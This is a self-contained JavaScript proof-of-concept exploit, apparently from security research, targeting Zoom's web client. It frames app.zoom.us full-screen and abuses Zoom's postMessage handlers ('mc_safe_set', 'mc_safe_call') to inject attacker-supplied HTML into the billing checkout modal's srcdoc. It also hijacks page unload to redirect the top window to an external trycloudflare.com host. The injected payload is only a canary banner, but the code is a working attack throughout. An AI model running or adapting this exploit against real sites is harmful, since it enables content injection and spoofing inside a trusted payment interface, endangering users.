(() => {
  const ZOOM = "https://app.zoom.us";
  const CANCEL_204 =
    "https://remedy-attorney-api-herb.trycloudflare.com/204-cancel-navigation";
  const CANARY_ID = "zoom-frame-poc";
  const CANARY_HTML =
    '<!doctype html><meta charset="utf-8"><body style="margin:0;min-height:100vh;display:grid;place-items:center;font:24px system-ui;background:#f3f7ff"><main style="padding:48px;border:4px solid #2d6cdf;border-radius:20px;background:#fff;text-align:center"><h1>DEVFORUM_IFRAME_POSTMESSAGE_CONFIRMED</h1><p>One-shot static HTML canary.</p></main></body>';
  const PATHS = [
    "__billingActiveCheckoutModal.instance.modalDom.children.0.children.1.children.1.children.1.srcdoc",
    "__billingActiveCheckoutModal.instance.modalDom.children.0.children.0.children.1.children.1.srcdoc"
  ];

  // Cleanup prior run.
  window.__zoomPoc?.stop?.();
  document.getElementById(CANARY_ID)?.remove();

  // Remove only known prompt handlers.
  if (window.__zoomBeforeUnload) {
    removeEventListener("beforeunload", window.__zoomBeforeUnload);
    window.__zoomBeforeUnload = null;
  }

  // Silent one-shot 204 counter-navigation.
  let armed = false;
  let used = false;

  const silentUnload = () => {
    if (!used) armed = true;
  };

  const timer = setInterval(() => {
    if (!armed || used) return;
    used = true;
    armed = false;
    clearInterval(timer);
    removeEventListener("beforeunload", silentUnload);
    console.log("silent 204 guard triggered");
    window.top.location.href = CANCEL_204;
  }, 1);

  addEventListener("beforeunload", silentUnload, { once: false });

  // Create Zoom iframe.
  const iframe = document.createElement("iframe");
  iframe.id = CANARY_ID;
  iframe.src = `${ZOOM}/wc/home`;
  Object.assign(iframe.style, {
    position: "fixed",
    inset: "0",
    width: "100vw",
    height: "100vh",
    border: "0",
    zIndex: "999999"
  });
  document.body.appendChild(iframe);

  const state = window.__zoomPoc = {
    token: crypto.randomUUID(),
    ready: false,
    handler: null,
    stop: null
  };

  state.stop = () => {
    clearInterval(timer);
    clearInterval(state.injectTimer);
    clearTimeout(state.retryTimer);
    if (state.handler) removeEventListener("message", state.handler);
  };

  const inject = () => {
    if (!state.ready || !iframe.isConnected) return;
    for (const objectPath of PATHS) {
      iframe.contentWindow.postMessage({
        type: "mc_safe_set",
        objectPath,
        value: CANARY_HTML
      }, ZOOM);
    }
    setTimeout(() => {
      iframe.contentWindow.postMessage({ type: "mc_hiddenLoading" }, ZOOM);
    }, 75);
  };

  state.handler = event => {
    if (
      state.ready ||
      event.source !== iframe.contentWindow ||
      event.origin !== ZOOM ||
      event.data?.type !== "ZOOM_IFRAME_READY" ||
      event.data?.token !== state.token
    ) return;

    state.ready = true;
    clearInterval(state.probeTimer);
    console.log("Zoom listener ready; click Upgrade");

    state.injectTimer = setInterval(inject, 350);
    inject();

    state.retryTimer = setTimeout(() => {
      clearInterval(state.injectTimer);
      console.log("PoC retry window ended");
    }, 120000);
  };

  addEventListener("message", state.handler);

  const probe = () => {
    if (!iframe.isConnected) return state.stop();
    iframe.contentWindow.postMessage({
      type: "mc_safe_call",
      objectPath: "parent.postMessage",
      args: [{
        type: "ZOOM_IFRAME_READY",
        token: state.token
      }, location.origin]
    }, ZOOM);
  };

  state.probeTimer = setInterval(probe, 300);
  iframe.addEventListener("load", probe);
  probe();

  return "ZOOM_POC_ARMED_SILENT_204";
})();
